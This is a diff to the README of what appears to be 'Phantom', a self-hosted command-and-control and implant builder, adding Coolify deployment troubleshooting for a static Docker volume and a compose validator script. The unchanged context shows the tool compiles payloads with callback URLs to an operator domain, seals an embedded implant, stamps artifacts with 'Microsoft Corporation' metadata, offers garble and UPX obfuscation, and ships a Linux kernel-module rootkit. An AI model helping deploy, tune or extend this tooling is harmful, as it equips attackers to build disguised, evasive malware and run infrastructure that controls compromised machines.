@@ -52,7 +52,7 @@ Log in with that and you're done. Everything else is automatic:
 | Dashboard login | Random `admin:<20 chars>` on first boot, persisted in `/data/auth`, printed in the logs | `PHANTOM_AUTH=user:pass` |
 | PSK | Random 32-byte key persisted in `/data/psk` | `PHANTOM_PSK` (64 hex chars) |
 | Callback URL | Derived per request from `X-Forwarded-Host`, so payloads always point at your domain | `PHANTOM_PUBLIC_URL` |
-| Volume | Named volume mounted at `/data`, holds auth, PSK, builds and blobs | `PHANTOM_DATA` |
+| Volume | Named volume mounted at `/data` (fixed target), holds auth, PSK, builds and blobs | `PHANTOM_DATA` |
 | Health check | `HEALTHCHECK` on `/healthz`; path is public, no credentials needed | `PHANTOM_PORT` |
 
 ### All settings
@@ -70,7 +70,7 @@ template: [`.env.example`](.env.example).
 | `PHANTOM_PORT` | `80` | Listen port, keep it in sync with *Ports Exposes* |
 | `PHANTOM_TLS` | `false` | Keep off — the proxy terminates TLS |
 | `PHANTOM_LOG` | `info` | Uvicorn log level |
-| `PHANTOM_DATA` / `PHANTOM_BUILDS` | `/data`, `/data/builds` | Keep on the volume |
+| `PHANTOM_DATA` / `PHANTOM_BUILDS` | `/data`, `/data/builds` | Keep on the volume (`PHANTOM_DATA` must stay `/data`, the compose volume target is static) |
 | `PHANTOM_VENDOR` | `Microsoft Corporation` | PE metadata company on artifacts |
 | `PHANTOM_ENCRYPT` / `PHANTOM_METADATA` | `true` | Seal the embedded implant / apply metadata + icon |
 | `PHANTOM_GARBLE` / `PHANTOM_UPX` | `false` | Obfuscation / compression, requires `INSTALL_GARBLE=1` / `INSTALL_UPX=1` build arg |
@@ -80,6 +80,27 @@ template: [`.env.example`](.env.example).
 
 The container compiles payloads on demand: keep the `/data` volume (without it a
 redeploy rotates the PSK and breaks every bot built before) and give it ~1.5 GB RAM.
+
+### `Compose file is not safe to use ... Invalid volume target: contains forbidden character`
+
+Coolify validates `docker-compose.yml` against its own rules *before* it loads
+it, and does not interpolate variables in every field. In volume definitions a
+target of `${PHANTOM_DATA:-/data}` is rejected (`$`, `{`, `}`, `:` are forbidden
+there). The volume target is therefore static:
+
+```yaml
+volumes:
+  - phantom-data:/data
+```
+
+Keep `PHANTOM_DATA=/data`; changing it does not move the mount, only where the
+app writes inside the container. The same reasoning applies to `expose:` — it is
+fixed at `80`, and the healthcheck curls `127.0.0.1:80` directly. Variables are
+fine in `environment:` and `build.args:` (Coolify does not shell-escape those).
+
+Run `./tools/coolify-validate.ps1` after touching `docker-compose.yml`: it
+executes Coolify's own validator against the file and prints `OK` or the exact
+error Coolify would raise.
 
 ### 502 Bad Gateway right after deploy
 
@@ -210,6 +231,7 @@ rootkit/            Linux LKM
 Dockerfile          Coolify-ready image
 docker-compose.yml  Coolify service definition (every setting = env var)
 .env.example        env template to paste into Coolify
+tools/              local helpers (incl. Coolify compose validator)
 ```
 
 ## API quick reference
